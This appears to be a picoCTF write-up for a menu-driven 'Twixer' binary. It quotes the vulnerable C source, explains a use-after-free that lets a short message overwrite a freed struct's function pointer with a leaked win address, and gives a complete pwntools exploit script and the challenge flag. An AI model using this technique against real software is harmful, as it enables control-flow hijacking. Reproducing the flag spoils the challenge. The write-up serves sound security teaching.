> Check out my new video-game and spaghetti-eating streaming channel on Twixer! program and get a flag. source nc mercury.picoctf.net 6312

## Find the vulnerability

We see that this is basically almost a CRUD (Create, Read, Update, Delete) menu.

```c
void printMenu(){
 	puts("Welcome to my stream! ^W^");
 	puts("==========================");
 	puts("(S)ubscribe to my channel");
 	puts("(I)nquire about account deletion");
 	puts("(M)ake an Twixer account");
 	puts("(P)ay for premium membership");
	puts("(l)eave a message(with or without logging in)");
	puts("(e)xit");
}
```

We see that we have the option to delete our account (I), create an account(M), create a message (M).

We see that in (S), the program will leak the address of `hahaexploitgobrrr`, the win function.

```c
void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}
...
void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}
```

P doesn't really do anything but print a string.

```c
void p(){
  	puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)");
}
```

Let's try to find the vulnerability. 

Within case 'M',  we see a reference to a getsline() function and a call to malloc:

```c
case 'M':
 	user->whatToDo = (void*)m;
	puts("===========================");
	puts("Registration: Welcome to Twixer!");
	puts("Enter your username: ");
	user->username = getsline();
...
char * getsline(void) {
	getchar();
	char * line = malloc(100), * linep = line;
	size_t lenmax = 100, len = lenmax;
	int c;
	if(line == NULL)
		return NULL;
	for(;;) {
		c = fgetc(stdin);
		if(c == EOF)
			break;
		if(--len == 0) {
			len = lenmax;
			char * linen = realloc(linep, lenmax *= 2);

			if(linen == NULL) {
				free(linep);
				return NULL;
			}
			line = linen + (line - linep);
			linep = linen;
		}

		if((*line++ = c) == '\n')
			break;
	}
	*line = '\0';
	return linep;
}
```

Ok, so we have a call to malloc, and a call to free in the I option, when we try to inquire about acount deletion:

```
void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}
```

So what now? Well, remember the fact that we can leave a message? We also have a call to malloc

```
void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}
```

Why is this important you may ask? Well, two pointers call malloc, and if open pointer is free'd without being reallocated then if we allocate data using malloc, that free'd pointer will reference that newly allocated data! 

Why is this bad? 

Well, when we do the menu options, we actually use the "user" as an address stored, and whatToDo will call it. And remember, both user and leave a message are both using malloc, with user being able to be freed.

```
void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}

and we can just call `P` since it doesn't do anything at all!

```
case 'P':
	user->whatToDo = (void*)p;
```

So here's the steps

1. Get the win address
2. Allocate 4 bytes (represents the 32-bit address we will use to overwrite the data) to user
3. Free user
4. Write the win address to write line
5. Call an option so the code will call the pointer which will be the win address

Here's the solve script:

```python
from pwn import *
from pwn import p32

elf = ELF('./vuln')

if args.REMOTE:
    r = remote('mercury.picoctf.net', 6312)
else:
    r = process(elf.path)

#define variables

def get_win_addr():
    r.sendline(b"S")
    r.recvuntil(b"leak...")
    win_addr = int(r.recvuntil("\n").rstrip(), 16)
    log.info("Got win addr: " + hex(win_addr))
    return win_addr

def create_account():
    r.sendline(b"M")
    payload = b'A'*4
    r.sendline(payload)

def delete_account():
    r.sendline(b"I")
    r.sendline(b"Y")

def leave_message(win_addr):
    r.sendline(b"l")
    r.recvuntil(b"anyways:")
    # Debug print
    log.info(f"Sending win addr: {hex(win_addr)}")
    r.send(p32(win_addr))
    log.info("Sent message")

#first get the win address
win = get_win_addr()
#allocate data to the account
create_account()
#free
delete_account()
#leave_message -> write in the address that will also be used by user pointer in malloc even if free'd
leave_message(win)
#something??
r.sendline(b"P")
r.interactive()
```
- the flag might be a little up at the top or in the middle of the menu

```picoCTF{d0ubl3_j30p4rdy_ad77070e}```